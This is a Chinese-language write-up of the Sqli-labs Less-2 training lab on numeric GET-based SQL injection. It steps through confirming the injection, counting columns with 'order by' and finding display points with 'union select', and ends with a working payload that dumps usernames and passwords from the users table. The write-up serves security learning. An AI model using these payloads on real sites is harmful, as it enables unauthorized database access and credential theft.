---
title: Sqli-labs Less-2 Writeup
date: 2026-11-01
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web]
---

# Sqli-labs Less-2 Writeup
## 题目描述
页面与 Less-1 类似，提示输入数字型 ID 参数。考察 GET 数字型注入。

## 解题思路
1. 访问 `?id=1` 正常回显。输入 `?id=1'` 页面报错。输入 `?id=1 and 1=1` 页面正常，输入 `?id=1 and 1=2` 无回显，确认存在**数字型注入**。后台 SQL 语句大概是：`SELECT * FROM users WHERE id=$id LIMIT 0,1`。
2. 判断字段数：输入 `?id=1 order by 3 --+` 正常，`?id=1 order by 4 --+` 报错，确认字段数为 3。
3. 寻找回显点：输入 `?id=-1 union select 1,2,3 --+`，确认回显点为 **2** 和 **3**。
4. 爆库、爆表、爆字段、脱库（步骤同 Less-1，只是去掉了单引号的闭合）。

> 知识点：数字型注入不需要使用单引号闭合，直接使用 `and` 或 `union select` 拼接即可。

## 通关 Payload
?id=-1 union select 1,2,group_concat(username,0x3a,password) from users --+
